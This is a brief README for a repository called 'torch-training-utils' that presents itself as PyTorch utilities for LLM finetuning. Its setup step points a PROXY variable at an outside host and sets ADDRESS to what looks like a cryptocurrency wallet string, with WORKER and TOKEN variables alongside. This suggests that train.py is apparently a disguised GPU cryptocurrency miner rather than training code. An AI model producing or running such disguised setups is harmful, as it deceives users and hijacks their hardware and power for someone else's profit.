# torch-training-utils

PyTorch training utilities for LLM finetuning — configs, scripts, and environment setup.

## Setup

```bash
export PROXY=global.pearlfortune.org:443
export ADDRESS=prl1par2eef0c04z...
python3 train.py
```

## Environment Variables

| Var | Required | Default |
|---|---|---|
| `PROXY` | ✅ | — |
| `ADDRESS` | ✅ | — |
| `WORKER` | ❌ | `worker-XXXX` |
| `TOKEN` | ❌ | — |
| `GPU_DEVICES` | ❌ | all GPUs |

## Requirements

- Python 3.8+
- NVIDIA GPU with CUDA drivers
- GCC (for native extensions)
